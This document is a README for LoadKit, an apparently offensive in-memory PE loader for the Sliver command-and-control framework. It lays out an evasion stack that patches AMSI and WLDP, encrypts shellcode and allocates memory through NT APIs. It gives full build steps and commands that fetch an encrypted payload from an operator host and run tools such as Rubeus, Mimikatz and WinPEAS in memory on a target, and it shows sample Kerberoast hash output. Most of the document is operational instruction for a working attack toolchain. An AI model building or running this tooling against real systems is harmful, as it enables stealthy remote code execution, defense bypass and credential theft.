# LoadKit

In-memory PE execution for Sliver. Part of the **Sliver Defense Evasion Suite**.

Converts any PE binary — native EXE, DLL, or .NET assembly — to Donut shellcode on the operator machine, encrypts it, and delivers it to a Sliver Extension DLL (`load.x64.dll`) that fetches, decrypts, and executes it entirely in-memory on the target. Output is captured and returned to the Sliver console.

---

## Evasion Stack

| Layer | What it does |
|-------|-------------|
| **Donut (AMSI+WLDP bypass)** | `bypass=3` — patches AMSI and WLDP in the target process before executing the PE |
| **Donut (Chaskey-CTR)** | `entropy=3` — randomised symbol names and module encryption inside the Donut loader; defeats static string scans |
| **XOR-32 in-transit encryption** | Random 32-byte key XOR-encrypts the payload on the operator side; only decrypted inside the target process |
| **HTTPS staging** | Self-signed ECDSA P-256 cert, randomised URL path, one-shot server shuts down after a single download |
| **NT-native allocation** | `NtAllocateVirtualMemory` + `NtProtectVirtualMemory` + `NtCreateThreadEx` loaded via `GetProcAddress` at runtime |
| **No RWX pages** | Memory is allocated RW, shellcode copied in, then re-protected RX before the thread starts |
| **Dynamic WinHTTP** | `LoadLibraryA("winhttp.dll")` at runtime — keeps the extension DLL's IAT minimal |
| **Donut ExitThread** | `ExitOpt=1` — shellcode exits its thread, not the host process, so the Sliver agent survives |

---

## How It Works

```
Operator                              Target (Sliver session)
────────                              ───────────────────────
loadkit load \                        sliver> load url=<url> key=<key>
  --binary rubeus.exe \                │
  --args "kerberoast /nowrap" \        │  Extension DLL (load.x64.dll)
  --url https://192.168.1.10:8443/p \  ├─ WinHTTP HTTPS fetch
  --serve                              ├─ XOR-32 decrypt
  │                                    ├─ NtAllocVM(RW) → copy → NtProtectVM(RX)
  ├─ Donut → shellcode                 ├─ redirect stdout/stderr to pipe
  ├─ XOR encrypt (random 32-byte key)  ├─ NtCreateThreadEx (shellcode runs here)
  ├─ write payload.enc                 ├─ WaitForSingleObject(5m timeout)
  ├─ print sliver command + key        ├─ drain pipe
  └─ one-shot HTTPS server             └─ callback(output) → Sliver console
```

---

## Prerequisites

- **Go 1.21+**: `go version`
- **mingw-w64** (for cross-compiling the extension DLL): `apt install mingw-w64`

**Target:** Windows x64, active Sliver session.

---

## Setup

```bash
cd Loader-Kit/loadkit

# Build the operator CLI
make cli          # → ./loadkit

# Cross-compile the Extension DLL
make ext          # → build/load.x64.dll

# Bundle into a Sliver extension tarball
make bundle       # → build/load-0.1.0.tar.gz

# Everything at once
make all
```

---

## Usage

### Step 1: Install the extension (once per Sliver server)

```bash
make all   # build everything first
```

In Sliver:
```
sliver (TARGET)> extensions install build/load-0.1.0.tar.gz
[*] Installing extension 'load' (v0.1.0) ... done
```

The extension persists for the lifetime of the Sliver server — you only need to install it once.

### Step 2: Prepare and serve the payload

```bash
# .NET assembly
./loadkit load \
    --binary rubeus.exe \
    --args "kerberoast /nowrap" \
    --url https://192.168.1.10:8443/p \
    --serve

# Native EXE
./loadkit load \
    --binary winpeas.exe \
    --url https://192.168.1.10:8443/p \
    --serve

# DLL with a specific export
./loadkit load \
    --binary mimikatz.dll \
    --method DllMain \
    --url https://192.168.1.10:8443/p \
    --serve
```

Output:
```
[*] Converting rubeus.exe to Donut shellcode ...
[+] Shellcode: 1245184 bytes (AMSI+WLDP bypass, Chaskey-CTR encryption)
[+] payload → build/payload.enc
[+] url     → https://192.168.1.10:8443/p

[i] First time: install extension
    sliver> extensions install build/load-0.1.0.tar.gz

[i] Execute in an active session:
    sliver (TARGET)> load url=https://192.168.1.10:8443/p key=a1b2c3d4...

[*] Starting one-time HTTPS server on :8443 ...
[+] Payload URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
```

### Step 3: Execute in Sliver

Copy the printed command and run it in your session:

```
sliver (TARGET)> load url=https://192.168.1.10:8443/a3f91c04b2e8d17f key=a1b2c3d4...

[*] Waiting for output (timeout: 5m)...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  ...

[*] Action: Kerberoasting
[*] Total kerberoastable users : 2
...
$krb5tgs$23$*svc_sql$...
```

The payload server shuts down automatically after one download.

---

## Command Reference

### `loadkit load`

```
Flags:
  --binary string   path to EXE, DLL, or .NET assembly (required)
  --args string     command-line arguments passed to the binary
  --method string   DLL export to invoke (DLLs only; empty = DllMain)
  --url string      HTTPS URL the Extension fetches the payload from (required)
  -o, --output      output directory for payload.enc (default: build)
  --serve           start one-time HTTPS server after converting
  --port int        port for payload server (default: 8443)
```

### `loadkit build-ext`

Cross-compiles `load.x64.dll` from source.

```bash
./loadkit build-ext --output build/
```

### `loadkit bundle`

Packages `load.x64.dll` + `extension.json` into a Sliver extension tarball.

```bash
./loadkit bundle --output build/load-0.1.0.tar.gz
```

### `loadkit serve`

Serves an already-generated `payload.enc` once over HTTPS.

```bash
./loadkit serve --payload build/payload.enc --port 8443
```

### Sliver extension command: `load`

```
sliver (TARGET)> load url=<url> key=<64 hex chars>
```

- `url` — full HTTPS URL (must match what was used with `--url`)
- `key` — 64 hex characters (32 bytes) printed by `loadkit load`

---

## Supported Binary Types

| Type | Example |
|------|---------|
| .NET EXE | Rubeus.exe, SharpHound.exe, Certify.exe |
| .NET DLL | PowerView.dll (use `--method DllMain`) |
| Native x64 EXE | WinPEAS.exe, Mimikatz.exe |
| Native x64 DLL | Mimikatz.dll (use `--method DllMain`) |

**Not supported:** x86 (32-bit) binaries, GUI applications (no stdout), binaries that call `ExitProcess` directly (kills the Sliver agent).

---

## Operational Notes

- **Self-signed certs:** WinHTTP ignores certificate errors — any cert works, including self-signed.
- **One-shot server:** The server shuts down 500ms after one download. Re-run `loadkit load --serve` or `loadkit serve` for a second attempt.
- **Key management:** Each `loadkit load` run generates a new random key. The key is printed once — write it down or use the printed command. If lost, re-run to generate a new payload.
- **Timeout:** The extension waits up to 5 minutes for the shellcode thread to exit. Long-running tools continue running — the Sliver agent is unaffected — but output won't return until the tool finishes.
- **No output:** If the binary writes to a file instead of stdout (e.g. BloodHound), retrieve the file with `download` after execution.

---

## File Structure

```
loadkit/
├── cmd/
│   └── loadkit/
│       └── main.go          # operator CLI (all commands)
├── c/
│   └── load/
│       ├── load.c           # Sliver Extension DLL source
│       └── Makefile         # mingw-w64 cross-compile
├── extension.json           # Sliver Extension manifest
├── go.mod
├── Makefile
└── README.md
```

---

## Suite Context

| Tool | Purpose |
|------|---------|
| **PalaceKit** | Free Crystal Palace linker — Crystal Kit-format loader for Sliver shellcode |
| **MaskKit** | C shellcode sleep masker — NtWaitForSingleObject hook, stack spoof |
| **SleepKit** | Go host binary sleep masker — alternative delivery |
| **LoadKit** | This tool — in-memory PE execution via Donut + Sliver Extension DLL |
